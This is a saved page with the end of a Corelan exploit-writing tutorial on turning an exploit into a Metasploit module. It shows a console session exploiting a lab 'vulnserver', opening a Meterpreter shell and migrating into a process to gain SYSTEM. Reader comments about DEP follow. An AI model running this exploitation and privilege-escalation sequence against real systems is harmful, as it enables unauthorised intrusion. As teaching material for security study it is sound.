<pre style="border-bottom: #808080 1px solid; border-left: #808080 1px solid; padding-bottom: 5px; background-color: #5d5d5d; min-height: 40px; padding-left: 5px; width: 650px; padding-right: 5px; overflow: auto; border-top: #808080 1px solid; border-right: #808080 1px solid; padding-top: 5px">meterpreter &gt;
meterpreter &gt; quit

[*] Meterpreter session 1 closed.
msf exploit(custom_vulnserver) &gt; set rhost 192.168.24.3
rhost =&gt; 192.168.24.3
msf exploit(custom_vulnserver) &gt; set target 1
target =&gt; 1
msf exploit(custom_vulnserver) &gt; show options

<a style="color: #ff0000" href="http://www.ruby-doc.org/docs/rdoc/1.9/classes/Module.html">Module</a> options:

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST  192.168.24.3     yes       The target address
   RPORT  200              yes       The target port     

Payload options (windows/meterpreter/bind_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique: seh, thread, process
   LPORT     4444             yes       The local port
   RHOST     192.168.24.3     no        The target address                    

Exploit target:

   Id  Name
   --  ----
   1   Windows 2003 Server R2 SP2  

msf exploit(custom_vulnserver) &gt; exploit

[*] Started bind handler
[*] Transmitting intermediate stager <span style="color: #5576D1">for</span> over-sized stage...(216 bytes)
[*] Sending stage (718336 bytes)
[*] Meterpreter session 2 opened (192.168.24.1:56109 -&gt; 192.168.24.3:4444)

meterpreter &gt; sysinfo
Computer: WIN2003-01
OS      : Windows .NET Server (Build 3790, Service Pack 2).

meterpreter &gt; getuid
Server username: WIN2003-01\Administrator
meterpreter &gt; ps

Process list
============

    PID   Name               Path
    ---   ----               ----
    300   smss.exe           \SystemRoot\System32\smss.exe
    372   winlogon.exe       \??\C:\WINDOWS\<span style="color: #00008b">system</span>32\winlogon.exe
    396   Explorer.EXE       C:\WINDOWS\Explorer.EXE
    420   services.exe       C:\WINDOWS\<span style="color: #00008b">system</span>32\services.exe
    424   ctfmon.exe         C:\WINDOWS\<span style="color: #00008b">system</span>32\ctfmon.exe
    432   lsass.exe          C:\WINDOWS\<span style="color: #00008b">system</span>32\lsass.exe
    652   svchost.exe        C:\WINDOWS\<span style="color: #00008b">system</span>32\svchost.exe
    832   svchost.exe        C:\WINDOWS\System32\svchost.exe
    996   spoolsv.exe        C:\WINDOWS\<span style="color: #00008b">system</span>32\spoolsv.exe
    1132  svchost.exe        C:\WINDOWS\System32\svchost.exe
    1392  dllhost.exe        C:\WINDOWS\<span style="color: #00008b">system</span>32\dllhost.exe
    1580  svchost.exe        C:\WINDOWS\System32\svchost.exe
    1600  svchost.exe        C:\WINDOWS\System32\svchost.exe
    2352  cmd.exe            C:\WINDOWS\<span style="color: #00008b">system</span>32\cmd.exe
    2888  vulnserver.exe     C:\vulnserver\lcc\vulnserver.exe                               

meterpreter &gt; migrate 996
[*] Migrating to 996...
[*] Migration completed successfully.
meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM</pre>
<pre class="csharpcode"><strong>pwned !</strong></pre>
<p><!--.csharpcode, .csharpcode pre { 	font-size: small; 	color: black; 	font-family: consolas, "Courier New", courier, monospace; 	background-color: #ffffff; 	/*white-space: pre;*/ } .csharpcode pre { margin: 0em; } .csharpcode .rem { color: #d7df01; } .csharpcode .kwrd { color: #0000ff; } .csharpcode .str { color: #006080; } .csharpcode .op { color: #0000c0; } .csharpcode .preproc { color: #cc6633; } .csharpcode .asp { background-color: #ffff00; } .csharpcode .html { color: #800000; } .csharpcode .attr { color: #ff0000; } .csharpcode .alt  { 	background-color: #f4f4f4; 	width: 100%; 	margin: 0em; } .csharpcode .lnum { color: #606060; } --></p>
<h3>More info about the Metasploit API</h3>
<p>You can find more information about the Metasploit API (and available classes) at <a title="http://www.metasploit.com/documents/api/msfcore/index.html" href="http://www.metasploit.com/documents/api/msfcore/index.html">http://www.metasploit.com/documents/api/msfcore/index.html</a></p>
<p>&nbsp;</p>
<p>Now go out and build your own exploits, put some l33t talk in the exploit and don’t forget to send your greetings to corelanc0d3r :-)</p>
<p style="text-align:left">© 2009 – 2010, <a href="https://www.corelan.be/">Corelan Team (corelanc0d3r)</a>. All rights reserved. </p>
<!--post 2196; Null return on select; dprv_e=, dprv_a_e=--><h3 class="related_post_title">Related Posts:</h3><ul class="related_post"><li><a href="https://www.corelan.be/index.php/2010/10/12/death-of-an-ftp-client/" title="Death of an ftp client / Birth of Metasploit modules">Death of an ftp client / Birth of Metasploit modules</a></li><li><a href="https://www.corelan.be/index.php/2011/07/27/metasploit-bounty-the-good-the-bad-and-the-ugly/" title="Metasploit Bounty – the Good, the Bad and the Ugly">Metasploit Bounty – the Good, the Bad and the Ugly</a></li><li><a href="https://www.corelan.be/index.php/2010/11/13/offensive-security-exploit-weekend/" title="Offensive Security Exploit Weekend">Offensive Security Exploit Weekend</a></li><li><a href="https://www.corelan.be/index.php/2010/02/25/exploit-writing-tutorial-part-9-introduction-to-win32-shellcoding/" title="Exploit writing tutorial part 9 : Introduction to Win32 shellcoding">Exploit writing tutorial part 9 : Introduction to Win32 shellcoding</a></li><li><a href="https://www.corelan.be/index.php/2009/07/28/seh-based-exploit-writing-tutorial-continued-just-another-example-part-3b/" title="Exploit writing tutorial part 3b : SEH Based Exploits – just another example">Exploit writing tutorial part 3b : SEH Based Exploits – just another example</a></li><li><a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/" title="Exploit writing tutorial part 1 : Stack Based Overflows">Exploit writing tutorial part 1 : Stack Based Overflows</a></li><li><a href="https://www.corelan.be/index.php/2011/05/12/hack-notes-ropping-eggs-for-breakfast/" title="Hack Notes : Ropping eggs for breakfast">Hack Notes : Ropping eggs for breakfast</a></li><li><a href="https://www.corelan.be/index.php/2010/08/22/exploit-notes-win32-eggs-to-omelet/" title="Exploit notes – win32 eggs-to-omelet">Exploit notes – win32 eggs-to-omelet</a></li><li><a href="https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/" title="Exploit writing tutorial part 8 : Win32 Egg Hunting">Exploit writing tutorial part 8 : Win32 Egg Hunting</a></li><li><a href="https://www.corelan.be/index.php/2009/09/05/exploit-writing-tutorial-part-5-how-debugger-modules-plugins-can-speed-up-basic-exploit-development/" title="Exploit writing tutorial part 5 : How debugger modules &amp; plugins can speed up basic exploit development">Exploit writing tutorial part 5 : How debugger modules &amp; plugins can speed up basic exploit development</a></li></ul>	                    <!-- /article-content -->
	                </div>
	                <div class="cleared"></div>
	                <div class="art-postmetadatafooter"><div class="art-postfootericons art-metadata-icons"><span class="categories">Posted in</span> <a href="https://www.corelan.be/index.php/category/security/" title="View all posts in 001_Security" rel="category tag">001_Security</a>, <a href="https://www.corelan.be/index.php/category/security/exploit-writing-tutorials/" title="View all posts in Exploit Writing Tutorials" rel="category tag">Exploit Writing Tutorials</a>, <a href="https://www.corelan.be/index.php/category/security/exploits/" title="View all posts in Exploits" rel="category tag">Exploits</a> | <span class="tags">Tagged</span> <a href="https://www.corelan.be/index.php/tag/buffer/" rel="tag">buffer</a>, <a href="https://www.corelan.be/index.php/tag/check/" rel="tag">check</a>, <a href="https://www.corelan.be/index.php/tag/custom-vulnserver/" rel="tag">custom vulnserver</a>, <a href="https://www.corelan.be/index.php/tag/encoder/" rel="tag">encoder</a>, <a href="https://www.corelan.be/index.php/tag/exe/" rel="tag">exe</a>, <a href="https://www.corelan.be/index.php/tag/exe-windows/" rel="tag">exe windows</a>, <a href="https://www.corelan.be/index.php/tag/exploit/" rel="tag">exploit</a>, <a href="https://www.corelan.be/index.php/tag/exploit-custom/" rel="tag">exploit custom</a>, <a href="https://www.corelan.be/index.php/tag/exploits/" rel="tag">Exploits</a>, <a href="https://www.corelan.be/index.php/tag/include/" rel="tag">include</a>, <a href="https://www.corelan.be/index.php/tag/initialize/" rel="tag">initialize</a>, <a href="https://www.corelan.be/index.php/tag/metasploit/" rel="tag">metasploit</a>, <a href="https://www.corelan.be/index.php/tag/meterpreter/" rel="tag">meterpreter</a>, <a href="https://www.corelan.be/index.php/tag/module/" rel="tag">module</a>, <a href="https://www.corelan.be/index.php/tag/msf/" rel="tag">msf</a>, <a href="https://www.corelan.be/index.php/tag/msf-exploit/" rel="tag">msf exploit</a>, <a href="https://www.corelan.be/index.php/tag/msfcore/" rel="tag">msf/core</a>, <a href="https://www.corelan.be/index.php/tag/offset/" rel="tag">offset</a>, <a href="https://www.corelan.be/index.php/tag/payload/" rel="tag">payload</a>, <a href="https://www.corelan.be/index.php/tag/port/" rel="tag">port</a>, <a href="https://www.corelan.be/index.php/tag/print/" rel="tag">print</a>, <a href="https://www.corelan.be/index.php/tag/rb/" rel="tag">rb</a>, <a href="https://www.corelan.be/index.php/tag/require/" rel="tag">require</a>, <a href="https://www.corelan.be/index.php/tag/ruby/" rel="tag">ruby</a>, <a href="https://www.corelan.be/index.php/tag/shellcode/" rel="tag">shellcode</a>, <a href="https://www.corelan.be/index.php/tag/socket/" rel="tag">socket</a>, <a href="https://www.corelan.be/index.php/tag/vulnserver/" rel="tag">vulnserver</a>, <a href="https://www.corelan.be/index.php/tag/windows/" rel="tag">windows</a>, <a href="https://www.corelan.be/index.php/tag/windows-system/" rel="tag">windows system</a></div></div>	            </div>
			<div class="cleared"></div>
	    </div>
	</div>
	
	<div class="art-post">
	    <div class="art-post-tl"></div>
	    <div class="art-post-tr"></div>
	    <div class="art-post-bl"></div>
	    <div class="art-post-br"></div>
	    <div class="art-post-tc"></div>
	    <div class="art-post-bc"></div>
	    <div class="art-post-cl"></div>
	    <div class="art-post-cr"></div>
	    <div class="art-post-cc"></div>
	    <div class="art-post-body">
	            <div class="art-post-inner art-article">
	            	                <div class="art-postcontent">
	                    <!-- article-content -->
	                    <h4 id="comments">7 Responses to <em>Exploit writing tutorial part 4 : From Exploit to Metasploit – The basics</em></h4>	                    <!-- /article-content -->
	                </div>
	                <div class="cleared"></div>
	                	            </div>
			<div class="cleared"></div>
	    </div>
	</div>
	
	<ul id="comments-list">		<li class="comment byuser comment-author-inquis even thread-even depth-1" id="li-comment-87">
			<div class="art-post" id="comment-87">
	    <div class="art-post-tl"></div>
	    <div class="art-post-tr"></div>
	    <div class="art-post-bl"></div>
	    <div class="art-post-br"></div>
	    <div class="art-post-tc"></div>
	    <div class="art-post-bc"></div>
	    <div class="art-post-cl"></div>
	    <div class="art-post-cr"></div>
	    <div class="art-post-cc"></div>
	    <div class="art-post-body">
	            <div class="art-post-inner art-article">
	            	                <div class="art-postcontent">
	                    <!-- article-content -->
	                    			<div class="comment-author vcard">
				<div class="avatar"><img src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/86306fe0bc4f3efa973b8251447c3c29" class="avatar avatar-48 avatar-default" height="48" width="48" style="width: 48px; height: 48px;"></div>
				<cite class="fn">inquis</cite> <span class="says">says:</span>			</div>
			
			<div class="comment-meta commentmetadata"><a href="https://www.corelan.be/index.php/2009/08/12/exploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics/#comment-87">
				October 5, 2009 at 15:09</a>			</div>

			<div class="comment-body"><p>Maybe it would be worth to mention that under Windows 2003 SP1+ the exploit works only if ‘vulnserver.exe’ is opt-out from DEP or DEP is set to ALWAYSOFF otherwise it will simply fail the execution with an ACCESS VIOLATION due to the fact that the memory space where we inject our shellcode is not marked as executable.</p>
<p>Btw, great tutorials. Very clean and well explained.<br>
What about tutorials on exploit writing (gdb and OS/compiler protections bypass) for Linux as well? Keep up the good work!</p>
</div>

			<div class="reply">
				<a rel="nofollow" class="comment-reply-login" href="https://www.corelan.be/wp-login.php?redirect_to=https%3A%2F%2Fwww.corelan.be%2Findex.php%2F2009%2F08%2F12%2Fexploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics%2F">Log in to Reply</a>			</div>
				                    <!-- /article-content -->
	                </div>
	                <div class="cleared"></div>
	                	            </div>
			<div class="cleared"></div>
	    </div>
	</div>
	
	

		</li>
		<li class="comment byuser comment-author-admin1 bypostauthor odd alt thread-odd thread-alt depth-1" id="li-comment-88">
			<div class="art-post" id="comment-88">
	    <div class="art-post-tl"></div>
	    <div class="art-post-tr"></div>
	    <div class="art-post-bl"></div>
	    <div class="art-post-br"></div>
	    <div class="art-post-tc"></div>
	    <div class="art-post-bc"></div>
	    <div class="art-post-cl"></div>
	    <div class="art-post-cr"></div>
	    <div class="art-post-cc"></div>
	    <div class="art-post-body">
	            <div class="art-post-inner art-article">
	            	                <div class="art-postcontent">
	                    <!-- article-content -->
	                    			<div class="comment-author vcard">
				<div class="avatar"><a href="http://www.corelan.be/index.php/about-me/" rel="external nofollow" title="Visit peterve’s website" class="snap_noshots"><img src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/corelanc0d3r_avatar3.jpg" class="avatar avatar-48 avatar-default" height="48" width="48" style="width: 48px; height: 48px;"></a></div>
				<cite class="fn"><a href="http://www.corelan.be:8800/" rel="external nofollow" class="url">Peter Van Eeckhoutte</a></cite> <span class="says">says:</span>			</div>
			
			<div class="comment-meta commentmetadata"><a href="https://www.corelan.be/index.php/2009/08/12/exploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics/#comment-88">
				October 5, 2009 at 15:17</a>			</div>

			<div class="comment-body"><p>ah yes – that’s true.<br>
I already had my system set in optout mode (in order to prepare for article 6), which is why the exploit worked on SP1+.</p>
<p>By the way : article 6 deals with OS/compiler protections :-)<br>
You’ll find the same vulnerable code/exploit back in that article, with the explanation on how to bypass DEP (and other protection mechanisms)..<br>
If you liked the tutorial series until know, then I’m pretty sure you will like part 6 too.</p>
<p>With regards to Linux : I’ll think about it…  </p>
<p>thanks for you kind feedback !</p>
</div>

			<div class="reply">
				<a rel="nofollow" class="comment-reply-login" href="https://www.corelan.be/wp-login.php?redirect_to=https%3A%2F%2Fwww.corelan.be%2Findex.php%2F2009%2F08%2F12%2Fexploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics%2F">Log in to Reply</a>			</div>
				                    <!-- /article-content -->
	                </div>
	                <div class="cleared"></div>
	                	            </div>
			<div class="cleared"></div>
	    </div>
	</div>
	
	

		</li>
		<li class="comment byuser comment-author-inquis even thread-even depth-1" id="li-comment-91">
			<div class="art-post" id="comment-91">
	    <div class="art-post-tl"></div>
	    <div class="art-post-tr"></div>
	    <div class="art-post-bl"></div>
	    <div class="art-post-br"></div>
	    <div class="art-post-tc"></div>
	    <div class="art-post-bc"></div>
	    <div class="art-post-cl"></div>
	    <div class="art-post-cr"></div>
	    <div class="art-post-cc"></div>
	    <div class="art-post-body">
	            <div class="art-post-inner art-article">
	            	                <div class="art-postcontent">
	                    <!-- article-content -->
	                    			<div class="comment-author vcard">
				<div class="avatar"><img src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/86306fe0bc4f3efa973b8251447c3c29" class="avatar avatar-48 avatar-default" height="48" width="48" style="width: 48px; height: 48px;"></div>
				<cite class="fn">inquis</cite> <span class="says">says:</span>			</div>
			
			<div class="comment-meta commentmetadata"><a href="https://www.corelan.be/index.php/2009/08/12/exploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics/#comment-91">
				October 9, 2009 at 15:48</a>			</div>

			<div class="comment-body"><p>I read part 6 as well, great work, thanks.<br>
I meant a series of tutorial for Linux (or Unix in general) as well would be great.</p>
</div>

			<div class="reply">
				<a rel="nofollow" class="comment-reply-login" href="https://www.corelan.be/wp-login.php?redirect_to=https%3A%2F%2Fwww.corelan.be%2Findex.php%2F2009%2F08%2F12%2Fexploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics%2F">Log in to Reply</a>			</div>
				                    <!-- /article-content -->
	                </div>
	                <div class="cleared"></div>
	                	            </div>
			<div class="cleared"></div>
	    </div>
	</div>
	
	

		</li>
		<li class="comment byuser comment-author-admin1 bypostauthor odd alt thread-odd thread-alt depth-1" id="li-comment-94">
			<div class="art-post" id="comment-94">
	    <div class="art-post-tl"></div>
	    <div class="art-post-tr"></div>
	    <div class="art-post-bl"></div>
	    <div class="art-post-br"></div>
	    <div class="art-post-tc"></div>
	    <div class="art-post-bc"></div>
	    <div class="art-post-cl"></div>
	    <div class="art-post-cr"></div>
	    <div class="art-post-cc"></div>
	    <div class="art-post-body">
	            <div class="art-post-inner art-article">
	            	                <div class="art-postcontent">
	                    <!-- article-content -->
	                    			<div class="comment-author vcard">
				<div class="avatar"><a href="http://www.corelan.be/index.php/about-me/" rel="external nofollow" title="Visit peterve’s website" class="snap_noshots"><img src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/corelanc0d3r_avatar3.jpg" class="avatar avatar-48 avatar-default" height="48" width="48" style="width: 48px; height: 48px;"></a></div>
				<cite class="fn"><a href="http://www.corelan.be:8800/" rel="external nofollow" class="url">Peter Van Eeckhoutte</a></cite> <span class="says">says:</span>			</div>
			
			<div class="comment-meta commentmetadata"><a href="https://www.corelan.be/index.php/2009/08/12/exploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics/#comment-94">
				October 9, 2009 at 16:12</a>			</div>

			<div class="comment-body"><p>if time permits (and/or if anyone wants to work with me to get another set of tutorials in place)… :-)</p>
</div>

			<div class="reply">
				<a rel="nofollow" class="comment-reply-login" href="https://www.corelan.be/wp-login.php?redirect_to=https%3A%2F%2Fwww.corelan.be%2Findex.php%2F2009%2F08%2F12%2Fexploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics%2F">Log in to Reply</a>			</div>
				                    <!-- /article-content -->
	                </div>
	                <div class="cleared"></div>
	                	            </div>
			<div class="cleared"></div>
	    </div>
	</div>
	
	

		</li>
		<li class="comment byuser comment-author-windchaser even thread-even depth-1" id="li-comment-126">
			<div class="art-post" id="comment-126">
	    <div class="art-post-tl"></div>
	    <div class="art-post-tr"></div>
	    <div class="art-post-bl"></div>
	    <div class="art-post-br"></div>
	    <div class="art-post-tc"></div>
	    <div class="art-post-bc"></div>
	    <div class="art-post-cl"></div>
	    <div class="art-post-cr"></div>
	    <div class="art-post-cc"></div>
	    <div class="art-post-body">
	            <div class="art-post-inner art-article">
	            	                <div class="art-postcontent">
	                    <!-- article-content -->
	                    			<div class="comment-author vcard">
				<div class="avatar"><a href="http://www.corelan.be/index.php/2009/08/12/exploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics/www.bluemoonsecurity.com" rel="external nofollow" title="Visit windchaser’s website" class="snap_noshots"><img src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/7ee3acfca95a0e6f32c37a5793e08bdb" class="avatar avatar-48 avatar-default" height="48" width="48" style="width: 48px; height: 48px;"></a></div>
				<cite class="fn"><a href="http://www.bluemoonsecurity.com/" rel="external nofollow" class="url">windchaser</a></cite> <span class="says">says:</span>			</div>
			
			<div class="comment-meta commentmetadata"><a href="https://www.corelan.be/index.php/2009/08/12/exploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics/#comment-126">
				November 11, 2009 at 13:57</a>			</div>

			<div class="comment-body"><p>Cool tutorial series</p>
</div>

			<div class="reply">
				<a rel="nofollow" class="comment-reply-login" href="https://www.corelan.be/wp-login.php?redirect_to=https%3A%2F%2Fwww.corelan.be%2Findex.php%2F2009%2F08%2F12%2Fexploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics%2F">Log in to Reply</a>			</div>
				                    <!-- /article-content -->
	                </div>
	                <div class="cleared"></div>
	                	            </div>
			<div class="cleared"></div>
	    </div>
	</div>
	
	

		</li>
		<li class="post pingback">
			<p>Pingback: <a href="http://www.rec-sec.com/2010/01/22/corelanc0d3r-exploit-tutorials/" rel="external nofollow" class="url">Recognize-Security | Peter Van Eeckhoutte’s Exploit Writing Tutorials</a></p>
		</li>
		<li class="comment byuser comment-author-deviker odd alt thread-odd thread-alt depth-1" id="li-comment-214">
			<div class="art-post" id="comment-214">
	    <div class="art-post-tl"></div>
	    <div class="art-post-tr"></div>
	    <div class="art-post-bl"></div>
	    <div class="art-post-br"></div>
	    <div class="art-post-tc"></div>
	    <div class="art-post-bc"></div>
	    <div class="art-post-cl"></div>
	    <div class="art-post-cr"></div>
	    <div class="art-post-cc"></div>
	    <div class="art-post-body">
	            <div class="art-post-inner art-article">
	            	                <div class="art-postcontent">
	                    <!-- article-content -->
	                    			<div class="comment-author vcard">
				<div class="avatar"><img src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/248e3c0a3096e99ec7e32180f6c6fb20" class="avatar avatar-48 avatar-default" height="48" width="48" style="width: 48px; height: 48px;"></div>
				<cite class="fn">deviker</cite> <span class="says">says:</span>			</div>
			
			<div class="comment-meta commentmetadata"><a href="https://www.corelan.be/index.php/2009/08/12/exploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics/#comment-214">
				March 2, 2010 at 15:42</a>			</div>

			<div class="comment-body"><p>Those are the best tuts since that old “specially crafted to feed your brain”. Thanks.</p>
</div>

			<div class="reply">
				<a rel="nofollow" class="comment-reply-login" href="https://www.corelan.be/wp-login.php?redirect_to=https%3A%2F%2Fwww.corelan.be%2Findex.php%2F2009%2F08%2F12%2Fexploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics%2F">Log in to Reply</a>			</div>
				                    <!-- /article-content -->
	                </div>
	                <div class="cleared"></div>
	                	            </div>
			<div class="cleared"></div>
	    </div>
	</div>
	
	

		</li>
</ul><div class="art-post" id="respond">
	    <div class="art-post-tl"></div>
	    <div class="art-post-tr"></div>
	    <div class="art-post-bl"></div>
	    <div class="art-post-br"></div>
	    <div class="art-post-tc"></div>
	    <div class="art-post-bc"></div>
	    <div class="art-post-cl"></div>
	    <div class="art-post-cr"></div>
	    <div class="art-post-cc"></div>
	    <div class="art-post-body">
	            <div class="art-post-inner art-article">
	            	                <div class="art-postcontent">
	                    <!-- article-content -->
	                    								<div>
				<h3 id="reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="http://www.corelan.be/index.php/2009/08/12/exploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics/#respond" style="display:none;">Cancel reply</a></small></h3>
									<p class="must-log-in">You must be <a href="https://www.corelan.be/wp-login.php?redirect_to=https%3A%2F%2Fwww.corelan.be%2Findex.php%2F2009%2F08%2F12%2Fexploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics%2F">logged in</a> to post a comment.</p>												</div><!-- #respond -->
							                    <!-- /article-content -->
	                </div>
	                <div class="cleared"></div>
	                	            </div>
			<div class="cleared"></div>
	    </div>
	</div>
	
	<div class="art-content-layout">
    <div class="art-content-layout-row">
					<div class="art-layout-cell art-layout-cell-size2">
						
			<div class="art-block widget Advman_Widget" id="advman-4">
    <div class="art-block-tl"></div>
    <div class="art-block-tr"></div>
    <div class="art-block-bl"></div>
    <div class="art-block-br"></div>
    <div class="art-block-tc"></div>
    <div class="art-block-bc"></div>
    <div class="art-block-cl"></div>
    <div class="art-block-cr"></div>
    <div class="art-block-cc"></div>
    <div class="art-block-body"><div class="art-blockcontent">
    <div class="art-blockcontent-body"><script type="text/javascript"><!--
google_ad_client = "pub-8134501503628637";
/* CorelanTopBottom */
google_ad_slot = "7639469771";
google_ad_width = 468;
google_ad_height = 60;
//-->
</script>
<script type="text/javascript" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/show_ads.js">
</script><ins style="display:inline-table;border:none;height:60px;margin:0;padding:0;position:relative;visibility:visible;width:468px"><ins id="aswift_1_anchor" style="display:block;border:none;height:60px;margin:0;padding:0;position:relative;visibility:visible;width:468px"><iframe allowtransparency="true" frameborder="0" height="60" hspace="0" marginwidth="0" marginheight="0" onload="var i=this.id,s=window.google_iframe_oncopy,H=s&amp;&amp;s.handlers,h=H&amp;&amp;H[i],w=this.contentWindow,d;try{d=w.document}catch(e){}if(h&amp;&amp;d&amp;&amp;(!d.body||!d.body.firstChild)){if(h.call){i+=&#39;.call&#39;;setTimeout(h,0)}else if(h.match){i+=&#39;.nav&#39;;w.location.replace(h)}s.log&amp;&amp;s.log.push(i)}" scrolling="no" vspace="0" width="468" id="aswift_1" name="aswift_1" style="left:0;position:absolute;top:0;"></iframe></ins></ins>		<div class="cleared"></div>
    </div>
</div>		<div class="cleared"></div>
    </div>
</div>				
				<div class="cleared"> </div>
			</div>
						<div class="art-layout-cell art-layout-cell-size2">
						
			<div class="art-block widget Advman_Widget" id="advman-5">
    <div class="art-block-tl"></div>
    <div class="art-block-tr"></div>
    <div class="art-block-bl"></div>
    <div class="art-block-br"></div>
    <div class="art-block-tc"></div>
    <div class="art-block-bc"></div>
    <div class="art-block-cl"></div>
    <div class="art-block-cr"></div>
    <div class="art-block-cc"></div>
    <div class="art-block-body"><div class="art-blockcontent">
    <div class="art-blockcontent-body"><script type="text/javascript"><!--
google_ad_client = "pub-8134501503628637";
/* CorelanTopBottom */
google_ad_slot = "7639469771";
google_ad_width = 468;
google_ad_height = 60;
//-->
</script>
<script type="text/javascript" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/show_ads.js">
</script><ins style="display:inline-table;border:none;height:60px;margin:0;padding:0;position:relative;visibility:visible;width:468px"><ins id="aswift_2_anchor" style="display:block;border:none;height:60px;margin:0;padding:0;position:relative;visibility:visible;width:468px"><iframe allowtransparency="true" frameborder="0" height="60" hspace="0" marginwidth="0" marginheight="0" onload="var i=this.id,s=window.google_iframe_oncopy,H=s&amp;&amp;s.handlers,h=H&amp;&amp;H[i],w=this.contentWindow,d;try{d=w.document}catch(e){}if(h&amp;&amp;d&amp;&amp;(!d.body||!d.body.firstChild)){if(h.call){i+=&#39;.call&#39;;setTimeout(h,0)}else if(h.match){i+=&#39;.nav&#39;;w.location.replace(h)}s.log&amp;&amp;s.log.push(i)}" scrolling="no" vspace="0" width="468" id="aswift_2" name="aswift_2" style="left:0;position:absolute;top:0;"></iframe></ins></ins>		<div class="cleared"></div>
    </div>
</div>		<div class="cleared"></div>
    </div>
</div>				
				<div class="cleared"> </div>
			</div>
					
    </div>
</div>
	          <div class="cleared"></div>
        </div>
        <div class="art-layout-cell art-sidebar1">
          <div class="art-block widget widget_search" id="search-2">
    <div class="art-block-tl"></div>
    <div class="art-block-tr"></div>
    <div class="art-block-bl"></div>
    <div class="art-block-br"></div>
    <div class="art-block-tc"></div>
    <div class="art-block-bc"></div>
    <div class="art-block-cl"></div>
    <div class="art-block-cr"></div>
    <div class="art-block-cc"></div>
    <div class="art-block-body"><div class="art-blockcontent">
    <div class="art-blockcontent-body"> <form method="get" name="searchform" action="https://www.corelan.be/">
    <div class="search">
        <input name="s" type="text" value="" style="width: 95%;">
        <span class="art-button-wrapper">
            <span class="art-button-l"> </span>
            <span class="art-button-r"> </span>
            <input class="art-button" type="submit" name="search" value="Search">
        </span>
    </div>
</form>
		<div class="cleared"></div>
    </div>
</div>		<div class="cleared"></div>
    </div>
</div><div class="art-block widget widget_simpleimage" id="simpleimage-4">
    <div class="art-block-tl"></div>
    <div class="art-block-tr"></div>
    <div class="art-block-bl"></div>
    <div class="art-block-br"></div>
    <div class="art-block-tc"></div>
    <div class="art-block-bc"></div>
    <div class="art-block-cl"></div>
    <div class="art-block-cr"></div>
    <div class="art-block-cc"></div>
    <div class="art-block-body"><div class="art-blockcontent">
    <div class="art-blockcontent-body">  	<div class="simpleimage">
  	  <a href="http://2011.brucon.org/index.php/Main_Page" target="_blank">  		<img src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/brucon_logo.jpg" alt="">
  		</a>  	</div>
  			<div class="cleared"></div>
    </div>
</div>		<div class="cleared"></div>
    </div>
</div><div class="art-block widget widget_text" id="text-6">
    <div class="art-block-tl"></div>
    <div class="art-block-tr"></div>
    <div class="art-block-bl"></div>
    <div class="art-block-br"></div>
    <div class="art-block-tc"></div>
    <div class="art-block-bc"></div>
    <div class="art-block-cl"></div>
    <div class="art-block-cr"></div>
    <div class="art-block-cc"></div>
    <div class="art-block-body"><div class="art-blockheader">
    <h3 class="t">Corelan on IRC</h3>
</div><div class="art-blockcontent">
    <div class="art-blockcontent-body">			<div class="textwidget">You can chat with us and our friends on #corelan (freenode IRC)</div>
				<div class="cleared"></div>
    </div>
</div>		<div class="cleared"></div>
    </div>
</div><div class="art-block widget widget_meta" id="meta-2">
    <div class="art-block-tl"></div>
    <div class="art-block-tr"></div>
    <div class="art-block-bl"></div>
    <div class="art-block-br"></div>
    <div class="art-block-tc"></div>
    <div class="art-block-bc"></div>
    <div class="art-block-cl"></div>
    <div class="art-block-cr"></div>
    <div class="art-block-cc"></div>
    <div class="art-block-body"><div class="art-blockheader">
    <h3 class="t">Actions</h3>
</div><div class="art-blockcontent">
    <div class="art-blockcontent-body">			<ul>
			<li><a href="https://www.corelan.be/wp-login.php?action=register">Register</a></li>			<li><a href="https://www.corelan.be/wp-login.php">Log in</a></li>
			<li><a href="https://www.corelan.be/index.php/feed/" title="Syndicate this site using RSS 2.0">Entries <abbr title="Really Simple Syndication">RSS</abbr></a></li>
			<li><a href="https://www.corelan.be/index.php/comments/feed/" title="The latest comments to all posts in RSS">Comments <abbr title="Really Simple Syndication">RSS</abbr></a></li>
			<li><a href="http://wordpress.org/" title="Powered by WordPress, state-of-the-art semantic personal publishing platform.">WordPress.org</a></li>
						</ul>
		<div class="cleared"></div>
    </div>
</div>		<div class="cleared"></div>
    </div>
</div><div class="art-block widget widget_text" id="text-3">
    <div class="art-block-tl"></div>
    <div class="art-block-tr"></div>
    <div class="art-block-bl"></div>
    <div class="art-block-br"></div>
    <div class="art-block-tc"></div>
    <div class="art-block-bc"></div>
    <div class="art-block-cl"></div>
    <div class="art-block-cr"></div>
    <div class="art-block-cc"></div>
